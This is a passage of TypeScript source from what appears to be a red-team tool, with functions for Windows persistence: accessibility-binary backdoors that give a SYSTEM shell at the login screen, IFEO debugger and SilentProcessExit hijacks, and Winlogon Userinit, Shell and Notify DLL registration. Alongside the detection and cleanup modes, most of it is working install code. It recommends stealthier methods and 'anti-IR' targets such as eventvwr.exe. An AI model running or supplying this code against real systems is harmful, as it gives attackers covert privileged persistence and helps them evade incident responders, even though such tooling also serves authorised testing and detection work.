        `if exist "${backupPath}" (copy "${backupPath}" "${targetPath}" /Y && del "${backupPath}") else (echo NO_BACKUP)`,
        timeout,
      )
      output.push(
        restore.stdout.includes("NO_BACKUP")
          ? "[*] No backup found — restore from WinSxS manually"
          : `[+] ${t.exe} restored from backup`,
      )
      await cmd(
        `reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /f`,
        timeout,
      )
      output.push("[+] IFEO debugger removed (if existed)")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== Accessibility Backdoor Check ==="
Write-Output ""

$targets = @{
  'sethc' = @{ Exe = 'sethc.exe'; Trigger = 'Shift x5' }
  'utilman' = @{ Exe = 'utilman.exe'; Trigger = 'Win+U' }
  'narrator' = @{ Exe = 'Narrator.exe'; Trigger = 'Win+Enter' }
  'osk' = @{ Exe = 'osk.exe'; Trigger = 'On-Screen Keyboard' }
  'magnify' = @{ Exe = 'Magnify.exe'; Trigger = 'Win+Plus' }
}

$backdoored = 0
foreach ($name in $targets.Keys) {
  $t = $targets[$name]
  $path = "$env:SystemRoot\\System32\\$($t.Exe)"
  if (Test-Path $path) {
    $hash = (Get-FileHash $path -Algorithm MD5).Hash
    $sig = (Get-AuthenticodeSignature $path -ErrorAction SilentlyContinue).Status
    $size = (Get-Item $path).Length

    # Check if it's been replaced (cmd.exe is ~302KB, sethc.exe is ~15KB)
    $cmdHash = (Get-FileHash "$env:SystemRoot\\System32\\cmd.exe" -Algorithm MD5).Hash
    $isCmd = $hash -eq $cmdHash

    if ($isCmd) {
      Write-Output "[!] $($t.Exe) — REPLACED with cmd.exe ($($t.Trigger))"
      $backdoored++
    } elseif ($sig -ne 'Valid') {
      Write-Output "[!] $($t.Exe) — UNSIGNED (possibly replaced)"
      $backdoored++
    } else {
      Write-Output "[*] $($t.Exe) — Original (signed, $($size) bytes)"
    }

    # Check for IFEO debugger
    $ifeo = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$($t.Exe)" -Name Debugger -ErrorAction SilentlyContinue).Debugger
    if ($ifeo) {
      Write-Output "    [!] IFEO Debugger set: $ifeo"
      $backdoored++
    }
  } else {
    Write-Output "[-] $($t.Exe) — NOT FOUND"
  }
}
Write-Output ""
Write-Output "BACKDOORED=$backdoored"

# Check if Credential Guard blocks this
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
$cg = $dg -and ($dg.SecurityServicesRunning -contains 1)
Write-Output ""
Write-Output "Credential Guard: $(if ($cg) { 'ACTIVE — login screen credentials isolated, but SYSTEM shell still works' } else { 'NOT ACTIVE' })"

# Check RDP status (needed for remote exploitation)
$rdp = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections
Write-Output "RDP: $(if ($rdp -eq 0) { 'ENABLED' } else { 'DISABLED' })"
Write-Output "RDP_ENABLED=$(if ($rdp -eq 0) { '1' } else { '0' })"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const backdoored = r.stdout.match(/BACKDOORED=(\d+)/)
    if (backdoored && parseInt(backdoored[1]) > 0) {
      findings.push({
        checkId: "WIN-ACC-001",
        provider: "windows",
        severity: "critical",
        status: "BACKDOORED",
        resource: "accessibility://login-screen",
        title: `${backdoored[1]} accessibility backdoor(s) detected`,
        details:
          "Accessibility executables have been replaced or have IFEO debuggers set. SYSTEM shell available at login screen.",
        remediation: "Restore original files from C:\\Windows\\WinSxS or system image. Remove IFEO debugger entries.",
      })
    }
  }

  if (action === "install") {
    const script = `
Write-Output "=== Installing Accessibility Backdoor ==="
Write-Output "Target: ${t.exe}"
Write-Output "Payload: ${payload}"
Write-Output "Trigger: ${t.trigger}"
Write-Output ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
  Write-Output "[-] Administrator privileges required"
  Write-Output "STATUS=FAILED"
  exit
}

$targetPath = "$env:SystemRoot\\System32\\${t.exe}"
$backupPath = "$env:SystemRoot\\System32\\${t.exe}.bak"

# Backup original
if (Test-Path $targetPath) {
  if (-not (Test-Path $backupPath)) {
    Copy-Item $targetPath $backupPath -Force
    Write-Output "[+] Original backed up to: $backupPath"
  } else {
    Write-Output "[*] Backup already exists"
  }
}

# Take ownership and replace
try {
  takeown /f $targetPath /a 2>&1 | Out-Null
  icacls $targetPath /grant Administrators:F 2>&1 | Out-Null
  Copy-Item "$env:SystemRoot\\System32\\${payload}" $targetPath -Force
  Write-Output "[+] ${t.exe} replaced with ${payload}"
  Write-Output ""
  Write-Output "[+] Backdoor installed!"
  Write-Output "[*] Trigger: ${t.trigger}"
  Write-Output "[*] Result: SYSTEM shell at login screen"
  Write-Output ""
  Write-Output "[*] Remote usage:"
  Write-Output "    1. RDP to target"
  Write-Output "    2. At login screen: ${t.trigger}"
  Write-Output "    3. SYSTEM cmd.exe opens"
  Write-Output ""
  Write-Output "Cleanup: winhook accessibility_backdoor --action remove --target ${target}"
  Write-Output "STATUS=SUCCESS"
} catch {
  Write-Output "[-] Replace failed: $_"
  Write-Output "[*] Try IFEO method instead:"
  Write-Output "    reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}' /v Debugger /t REG_SZ /d '${payload}' /f"
  Write-Output ""

  # Fallback to IFEO
  Write-Output "[*] Attempting IFEO debugger method..."
  $ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}"
  New-Item -Path $ifeoKey -Force | Out-Null
  Set-ItemProperty $ifeoKey -Name Debugger -Value "$env:SystemRoot\\System32\\${payload}" -Type String
  Write-Output "[+] IFEO debugger set: ${t.exe} -> ${payload}"
  Write-Output "[*] When ${t.exe} launches, ${payload} runs instead"
  Write-Output "STATUS=SUCCESS_IFEO"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS") || r.stdout.includes("STATUS=SUCCESS_IFEO")) {
      findings.push({
        checkId: "WIN-ACC-012",
        provider: "windows",
        severity: "critical",
        status: "BACKDOORED",
        resource: `accessibility://${target}`,
        title: `Accessibility backdoor installed: ${t.exe} → ${payload}`,
        details: `${t.trigger} at login screen now spawns ${payload} as SYSTEM.`,
        remediation: `Remove: winhook accessibility_backdoor --action remove --target ${target}`,
      })
    }
  }

  if (action === "remove") {
    const script = `
Write-Output "=== Removing Accessibility Backdoor ==="

$targetPath = "$env:SystemRoot\\System32\\${t.exe}"
$backupPath = "$env:SystemRoot\\System32\\${t.exe}.bak"

# Restore from backup
if (Test-Path $backupPath) {
  takeown /f $targetPath /a 2>&1 | Out-Null
  icacls $targetPath /grant Administrators:F 2>&1 | Out-Null
  Copy-Item $backupPath $targetPath -Force
  Remove-Item $backupPath -Force
  Write-Output "[+] Original ${t.exe} restored from backup"
} else {
  Write-Output "[*] No backup found — restore from C:\\Windows\\WinSxS manually"
}

# Remove IFEO debugger
$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}"
$debugger = (Get-ItemProperty $ifeoKey -Name Debugger -ErrorAction SilentlyContinue).Debugger
if ($debugger) {
  Remove-ItemProperty $ifeoKey -Name Debugger -Force
  Write-Output "[+] IFEO debugger removed for ${t.exe}"
}

Write-Output "[+] Backdoor removed"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function ifeoPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const targetProc = argVal(args, "--target")
  const payloadPath = argVal(args, "--payload")
  const method = argVal(args, "--method") || "debugger"
  const findings: Finding[] = []
  const output: string[] = ["[*] IFEO (Image File Execution Options) persistence...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== IFEO Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(
        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "Debugger"`,
        timeout,
      )
      output.push("[*] IFEO Debugger entries:\n" + (r.stdout || "(none found)"))
      const r2 = await cmd(
        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "GlobalFlag"`,
        timeout,
      )
      if (r2.exitCode === 0 && r2.stdout.includes("GlobalFlag")) output.push("\n[*] GlobalFlag entries:\n" + r2.stdout)
      const debuggerCount = (r.stdout.match(/Debugger/g) || []).length
      if (debuggerCount > 0)
        findings.push({
          checkId: "WIN-IFEO-001",
          provider: "windows",
          severity: "high",
          status: "SUSPICIOUS",
          resource: "registry://ifeo",
          title: `${debuggerCount} IFEO debugger entries found`,
          details: "IFEO entries redirect process execution. Review for malicious entries.",
          remediation: "Remove suspicious Debugger values from IFEO.",
        })
    }
    if (action === "install") {
      if (!targetProc || !payloadPath) {
        output.push("ERROR: --target and --payload required")
        return { output: output.join("\n"), findings }
      }
      const ifeoKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}`
      if (method === "debugger") {
        const r = await cmd(`reg add "${ifeoKey}" /v "Debugger" /t REG_SZ /d "${payloadPath}" /f`, timeout)
        output.push(
          r.exitCode === 0
            ? `[+] IFEO Debugger set: ${targetProc} → ${payloadPath}\n[*] Payload runs INSTEAD of target`
            : `[!] Failed: ${r.stderr}`,
        )
      }
      if (method === "silent-exit") {
        await cmd(`reg add "${ifeoKey}" /v "GlobalFlag" /t REG_DWORD /d 512 /f`, timeout)
        const silentKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}`
        await cmd(`reg add "${silentKey}" /v "ReportingMode" /t REG_DWORD /d 1 /f`, timeout)
        const r = await cmd(`reg add "${silentKey}" /v "MonitorProcess" /t REG_SZ /d "${payloadPath}" /f`, timeout)
        output.push(
          r.exitCode === 0
            ? `[+] SilentProcessExit set: ${targetProc}\n[*] Payload triggers WHEN target exits (stealthier)`
            : `[!] Failed: ${r.stderr}`,
        )
      }
      if (output.some((o) => o.includes("[+]")))
        findings.push({
          checkId: "WIN-IFEO-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `ifeo://${targetProc}`,
          title: `IFEO persistence: ${targetProc} → ${payloadPath} (${method})`,
          details: `${method === "debugger" ? "Runs instead of target" : "Triggers on target exit"}. Persists across reboots.`,
          remediation: `Remove: reg delete "${ifeoKey}" /v Debugger /f`,
        })
    }
    if (action === "remove") {
      if (!targetProc) {
        output.push("ERROR: --target required")
        return { output: output.join("\n"), findings }
      }
      const ifeoKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}`
      await cmd(`reg delete "${ifeoKey}" /v "Debugger" /f`, timeout)
      await cmd(`reg delete "${ifeoKey}" /v "GlobalFlag" /f`, timeout)
      await cmd(
        `reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}" /f`,
        timeout,
      )
      output.push(`[+] IFEO persistence removed for ${targetProc}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== IFEO Entries ==="
Write-Output ""

$ifeoRoot = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
$entries = Get-ChildItem $ifeoRoot -ErrorAction SilentlyContinue

$debuggerCount = 0
$silentCount = 0

foreach ($entry in $entries) {
  $debugger = (Get-ItemProperty $entry.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger
  $globalFlag = (Get-ItemProperty $entry.PSPath -Name GlobalFlag -ErrorAction SilentlyContinue).GlobalFlag

  if ($debugger) {
    $debuggerCount++
    Write-Output "[!] $($entry.PSChildName)"
    Write-Output "    Debugger: $debugger"
    Write-Output "    Type: IFEO Debugger (runs payload INSTEAD of target)"
    Write-Output ""
  }

  if ($globalFlag -eq 512) {
    $silentCount++
    # Check SilentProcessExit monitoring
    $silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$($entry.PSChildName)"
    $monitor = Get-ItemProperty $silentKey -ErrorAction SilentlyContinue
    if ($monitor) {
      Write-Output "[!] $($entry.PSChildName)"
      Write-Output "    GlobalFlag: 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)"
      Write-Output "    MonitorProcess: $($monitor.MonitorProcess)"
      Write-Output "    ReportingMode: $($monitor.ReportingMode)"
      Write-Output "    Type: SilentProcessExit (runs payload WHEN target exits)"
      Write-Output ""
    }
  }
}

Write-Output "DEBUGGER_COUNT=$debuggerCount"
Write-Output "SILENT_COUNT=$silentCount"
Write-Output ""
Write-Output "Total IFEO entries: $($entries.Count)"
Write-Output "With Debugger: $debuggerCount"
Write-Output "With SilentProcessExit: $silentCount"

if ($debuggerCount -gt 0 -or $silentCount -gt 0) {
  Write-Output ""
  Write-Output "[!] Suspicious IFEO entries found — possible persistence or debugging"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const debuggerCount = r.stdout.match(/DEBUGGER_COUNT=(\d+)/)
    const silentCount = r.stdout.match(/SILENT_COUNT=(\d+)/)
    const total = (debuggerCount ? parseInt(debuggerCount[1]) : 0) + (silentCount ? parseInt(silentCount[1]) : 0)

    if (total > 0) {
      findings.push({
        checkId: "WIN-IFEO-011",
        provider: "windows",
        severity: "high",
        status: "SUSPICIOUS",
        resource: "registry://ifeo",
        title: `${total} IFEO persistence entries found (${debuggerCount ? debuggerCount[1] : 0} debugger, ${silentCount ? silentCount[1] : 0} silent exit)`,
        details:
          "IFEO entries can redirect process execution or trigger payloads on process exit. Review for malicious entries.",
        remediation: "Remove suspicious Debugger values and SilentProcessExit monitoring.",
      })
    }
  }

  if (action === "install") {
    if (!targetProc || !payloadPath) {
      output.push("ERROR: --target and --payload required")
      output.push("")
      output.push("--target: Process name to intercept (e.g., notepad.exe, calc.exe)")
      output.push("--payload: Path to payload executable")
      output.push("")
      output.push("Methods:")
      output.push("  --method debugger      — Payload runs INSTEAD of target (visible)")
      output.push("  --method silent-exit   — Payload runs WHEN target exits (stealthier)")
      output.push("")
      output.push("Good targets for persistence:")
      output.push("  notepad.exe  — commonly opened by users and admins")
      output.push("  mmc.exe      — opened when launching management consoles")
      output.push("  eventvwr.exe — opened during incident response (anti-IR)")
      return { output: output.join("\n"), findings }
    }

    if (method === "debugger") {
      const script = `
Write-Output "=== Installing IFEO Debugger ==="
Write-Output "Target: ${targetProc}"
Write-Output "Payload: ${payloadPath}"
Write-Output ""

$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
New-Item -Path $ifeoKey -Force | Out-Null
Set-ItemProperty $ifeoKey -Name Debugger -Value '${payloadPath}' -Type String

$verify = (Get-ItemProperty $ifeoKey -Name Debugger).Debugger
Write-Output "[+] IFEO Debugger set: ${targetProc} -> $verify"
Write-Output ""
Write-Output "[*] When any user runs ${targetProc}, the payload executes instead"
Write-Output "[*] The payload receives the original command line as arguments"
Write-Output "[!] The original ${targetProc} does NOT run (may be noticed)"
Write-Output ""
Write-Output "Cleanup: winhook ifeo_persist --action remove --target ${targetProc}"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (method === "silent-exit") {
      const script = `
Write-Output "=== Installing SilentProcessExit Monitor ==="
Write-Output "Target: ${targetProc}"
Write-Output "Payload: ${payloadPath}"
Write-Output ""
Write-Output "[*] This is STEALTHIER than debugger method:"
Write-Output "    - Target process runs NORMALLY"
Write-Output "    - Payload triggers only AFTER target exits"
Write-Output "    - Less likely to be noticed by the user"
Write-Output ""

# Set GlobalFlag for the target process
$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
New-Item -Path $ifeoKey -Force | Out-Null
Set-ItemProperty $ifeoKey -Name GlobalFlag -Value 512 -Type DWord  # FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)

# Configure SilentProcessExit monitoring
$silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}"
New-Item -Path $silentKey -Force | Out-Null
Set-ItemProperty $silentKey -Name ReportingMode -Value 1 -Type DWord  # LAUNCH_MONITORPROCESS
Set-ItemProperty $silentKey -Name MonitorProcess -Value '${payloadPath}' -Type String

Write-Output "[+] GlobalFlag set to 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)"
Write-Output "[+] MonitorProcess: ${payloadPath}"
Write-Output ""
Write-Output "[*] Flow: User opens ${targetProc} -> uses normally -> closes it -> payload runs"
Write-Output "[*] Payload runs in the context of WerFault.exe (needs Windows Error Reporting)"
Write-Output ""
Write-Output "Cleanup: winhook ifeo_persist --action remove --target ${targetProc}"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (output.some((o) => o.includes("STATUS=SUCCESS"))) {
      findings.push({
        checkId: "WIN-IFEO-012",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `ifeo://${targetProc}`,
        title: `IFEO persistence installed: ${targetProc} → ${payloadPath} (${method})`,
        details: `${method === "debugger" ? "Payload runs instead of target" : "Payload triggers on target exit (stealthier)"}. Persists across reboots.`,
        remediation: `Remove: winhook ifeo_persist --action remove --target ${targetProc}`,
      })
    }
  }

  if (action === "remove") {
    if (!targetProc) {
      output.push("ERROR: --target required (process name to clean)")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Removing IFEO Persistence ==="

# Remove debugger
$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
$debugger = (Get-ItemProperty $ifeoKey -Name Debugger -ErrorAction SilentlyContinue).Debugger
if ($debugger) {
  Remove-ItemProperty $ifeoKey -Name Debugger -Force
  Write-Output "[+] Debugger removed for ${targetProc}"
}

# Remove GlobalFlag
$gf = (Get-ItemProperty $ifeoKey -Name GlobalFlag -ErrorAction SilentlyContinue).GlobalFlag
if ($gf) {
  Remove-ItemProperty $ifeoKey -Name GlobalFlag -Force
  Write-Output "[+] GlobalFlag removed for ${targetProc}"
}

# Remove SilentProcessExit
$silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}"
if (Test-Path $silentKey) {
  Remove-Item $silentKey -Recurse -Force
  Write-Output "[+] SilentProcessExit monitoring removed for ${targetProc}"
}

# Clean up empty IFEO key
$remaining = Get-ItemProperty $ifeoKey -ErrorAction SilentlyContinue
if (-not $remaining.Debugger -and -not $remaining.GlobalFlag) {
  Remove-Item $ifeoKey -Force -ErrorAction SilentlyContinue
  Write-Output "[+] Empty IFEO key removed"
}

Write-Output "[+] All IFEO persistence removed for ${targetProc}"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function winlogonPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const key = argVal(args, "--key") || "userinit"
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] Winlogon Helper DLL Persistence...\n"]

  const winlogonPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
  const winlogonCmd = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Winlogon Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const shell = await cmd(`reg query "${winlogonCmd}" /v "Shell"`, timeout)
      const userinit = await cmd(`reg query "${winlogonCmd}" /v "Userinit"`, timeout)
      output.push(`[*] Shell: ${shell.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "not found"}`)
      output.push(`    Default: explorer.exe`)
      output.push(`[*] Userinit: ${userinit.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "not found"}`)
      output.push(`    Default: C:\\Windows\\system32\\userinit.exe,`)
      const shellVal = shell.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
      const userinitVal = userinit.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
      if (shellVal && shellVal !== "explorer.exe") output.push("[!] Shell NON-DEFAULT — possible persistence")
      if (userinitVal && !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i))
        output.push("[!] Userinit NON-DEFAULT — possible persistence")
      if (shellVal !== "explorer.exe" || !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i))
        findings.push({
          checkId: "WIN-WLGN-001",
          provider: "windows",
          severity: "high",
          status: "SUSPICIOUS",
          resource: "registry://winlogon",
          title: "Non-default Winlogon values — possible persistence",
          details: `Shell: ${shellVal}, Userinit: ${userinitVal}`,
          remediation: "Verify non-default values. Restore defaults if malicious.",
        })
    }
    if (action === "install") {
      if (!payload) {
        output.push("ERROR: --payload required")
        return { output: output.join("\n"), findings }
      }
      if (key === "userinit") {
        const current = await cmd(`reg query "${winlogonCmd}" /v "Userinit"`, timeout)
        const curVal = current.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "C:\\Windows\\system32\\userinit.exe,"
        const newVal = `${curVal}${payload},`
        const r = await cmd(`reg add "${winlogonCmd}" /v "Userinit" /t REG_SZ /d "${newVal}" /f`, timeout)
        output.push(
          r.exitCode === 0
            ? `[+] Userinit updated: ${newVal}\n[*] Payload runs at every logon in SYSTEM context`
            : `[!] Failed: ${r.stderr}`,
        )
      }
      if (key === "shell") {
        const newVal = `${payload},explorer.exe`
        const r = await cmd(`reg add "${winlogonCmd}" /v "Shell" /t REG_SZ /d "${newVal}" /f`, timeout)
        output.push(
          r.exitCode === 0
            ? `[+] Shell updated: ${newVal}\n[*] Payload runs first, then explorer loads`
            : `[!] Failed: ${r.stderr}`,
        )
      }
      if (key === "notify") {
        const notifyKey = `${winlogonCmd}\\Notify\\CyberStrike`
        await cmd(`reg add "${notifyKey}" /v "DLLName" /t REG_SZ /d "${payload}" /f`, timeout)
        await cmd(`reg add "${notifyKey}" /v "Logon" /t REG_SZ /d "Handler" /f`, timeout)
        await cmd(`reg add "${notifyKey}" /v "Impersonate" /t REG_DWORD /d 0 /f`, timeout)
        const r = await cmd(`reg add "${notifyKey}" /v "Asynchronous" /t REG_DWORD /d 1 /f`, timeout)
        output.push(r.exitCode === 0 ? `[+] Winlogon Notify DLL registered: ${payload}` : `[!] Failed: ${r.stderr}`)
      }
      if (output.some((o) => o.includes("[+]")))
        findings.push({
          checkId: "WIN-WLGN-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `winlogon://${key}`,
          title: `Winlogon ${key} persistence: ${payload}`,
          details: `Executes at every logon in SYSTEM context.`,
          remediation: `Restore: reg add "${winlogonCmd}" /v "${key === "userinit" ? "Userinit" : "Shell"}" /t REG_SZ /d "${key === "userinit" ? "C:\\Windows\\system32\\userinit.exe," : "explorer.exe"}" /f`,
        })
    }
    if (action === "restore") {
      if (key === "userinit")
        await cmd(
          `reg add "${winlogonCmd}" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe," /f`,
          timeout,
        )
      if (key === "shell") await cmd(`reg add "${winlogonCmd}" /v "Shell" /t REG_SZ /d "explorer.exe" /f`, timeout)
      if (key === "notify") await cmd(`reg delete "${winlogonCmd}\\Notify\\CyberStrike" /f`, timeout)
      output.push(`[+] Winlogon ${key} restored to default`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Winlogon Registry Keys ==="
Write-Output ""

$wl = Get-ItemProperty '${winlogonPath}' -ErrorAction SilentlyContinue

Write-Output "[*] Shell: $($wl.Shell)"
Write-Output "    Default: explorer.exe"
Write-Output "    Purpose: Runs as user shell after logon"
if ($wl.Shell -and $wl.Shell -ne 'explorer.exe') {
  Write-Output "    [!] NON-DEFAULT — possible persistence"
}
Write-Output ""

Write-Output "[*] Userinit: $($wl.Userinit)"
Write-Output "    Default: C:\\Windows\\system32\\userinit.exe,"
Write-Output "    Purpose: Runs initialization scripts at logon (comma-separated list)"
$defaultUserinit = 'C:\\Windows\\system32\\userinit.exe,'
if ($wl.Userinit -and $wl.Userinit.Trim() -ne $defaultUserinit -and $wl.Userinit.Trim() -ne $defaultUserinit.TrimEnd(',')) {
  Write-Output "    [!] NON-DEFAULT — possible persistence"
}
Write-Output ""

Write-Output "[*] Notify: (checking legacy DLL notification packages)"
$notifyPath = '${winlogonPath}\\Notify'
if (Test-Path $notifyPath) {
  $notifyKeys = Get-ChildItem $notifyPath -ErrorAction SilentlyContinue
  foreach ($nk in $notifyKeys) {
    $dll = (Get-ItemProperty $nk.PSPath -Name DLLName -ErrorAction SilentlyContinue).DLLName
    Write-Output "    $($nk.PSChildName): $dll"
  }
  if ($notifyKeys.Count -eq 0) { Write-Output "    (none)" }
} else {
  Write-Output "    Notify subkey does not exist (normal on modern Windows)"
}
Write-Output ""

# Check Wow64 (32-bit) path too
$wl32 = Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -ErrorAction SilentlyContinue
if ($wl32) {
  Write-Output "=== Wow64 Winlogon ==="
  Write-Output "[*] Shell (32-bit): $($wl32.Shell)"
  Write-Output "[*] Userinit (32-bit): $($wl32.Userinit)"
}

Write-Output ""
Write-Output "[*] Winlogon keys execute in SYSTEM context at every user logon"
Write-Output "[*] Shell = user's desktop shell, Userinit = pre-shell initialization"
Write-Output "[*] Notify = legacy DLL callbacks (deprecated but still functional)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("NON-DEFAULT")) {
      findings.push({
        checkId: "WIN-WLGN-011",
        provider: "windows",
        severity: "high",
        status: "SUSPICIOUS",
        resource: "registry://winlogon",
        title: "Non-default Winlogon registry values detected — possible persistence",
        details: "Shell or Userinit values differ from defaults, which may indicate persistence mechanism.",
        remediation: "Verify the non-default values are legitimate. Restore defaults if malicious.",
      })
    }
  }

  if (action === "install") {
    if (!payload) {
      output.push("ERROR: --payload required")
      output.push("")
      output.push("Keys:")
      output.push("  --key userinit  — Append to Userinit (runs BEFORE shell, comma-separated)")
      output.push("  --key shell     — Replace Shell (runs AS the shell, risky — breaks desktop)")
      output.push("  --key notify    — Register Notify DLL (legacy, pre-Vista style)")
      output.push("")
      output.push("Recommended: --key userinit (least disruptive, payload runs alongside normal init)")
      return { output: output.join("\n"), findings }
    }

    if (key === "userinit") {
      const script = `
$current = (Get-ItemProperty '${winlogonPath}' -Name Userinit).Userinit
Write-Output "[*] Current Userinit: $current"

# Append payload (Userinit is comma-separated)
$new = "$current${payload},"
Set-ItemProperty '${winlogonPath}' -Name Userinit -Value $new -Type String
Write-Output "[+] New Userinit: $new"
Write-Output ""
Write-Output "[*] Payload will run at every user logon in SYSTEM context"
Write-Output "[*] Original programs still run (non-destructive append)"
Write-Output ""
Write-Output "Restore: winhook winlogon_persist --action restore --key userinit"
Write-Output "ORIGINAL=$current"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (key === "shell") {
      const script = `
$current = (Get-ItemProperty '${winlogonPath}' -Name Shell).Shell
Write-Output "[*] Current Shell: $current"
Write-Output "[!] WARNING: Replacing Shell will prevent explorer.exe from launching"
Write-Output "[!] The user will see your payload instead of their desktop"
Write-Output ""

# Set payload as shell (chain with explorer to be less obvious)
$new = "${payload},explorer.exe"
Set-ItemProperty '${winlogonPath}' -Name Shell -Value $new -Type String
Write-Output "[+] New Shell: $new"
Write-Output "[*] Payload runs first, then explorer.exe loads normally"
Write-Output ""
Write-Output "Restore: winhook winlogon_persist --action restore --key shell"
Write-Output "ORIGINAL=$current"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (key === "notify") {
      const script = `
$notifyPath = '${winlogonPath}\\Notify\\CyberStrike'
New-Item -Path $notifyPath -Force | Out-Null
Set-ItemProperty $notifyPath -Name DLLName -Value '${payload}' -Type String
Set-ItemProperty $notifyPath -Name Logon -Value 'Handler' -Type String
Set-ItemProperty $notifyPath -Name Impersonate -Value 0 -Type DWord
Set-ItemProperty $notifyPath -Name Asynchronous -Value 1 -Type DWord

Write-Output "[+] Winlogon Notify DLL registered: ${payload}"
Write-Output "[*] DLL loaded at logon, Handler export called"
Write-Output "[!] Note: Notify packages are deprecated post-Vista but registry key still processed on some systems"
Write-Output ""
Write-Output "Remove: winhook winlogon_persist --action restore --key notify"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (output.some((o) => o.includes("STATUS=SUCCESS"))) {
      findings.push({
        checkId: "WIN-WLGN-012",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `winlogon://${key}`,
        title: `Winlogon ${key} persistence installed: ${payload}`,
        details: `Payload registered via Winlogon ${key} key. Executes at every user logon in SYSTEM context.`,
        remediation: `Restore: winhook winlogon_persist --action restore --key ${key}`,
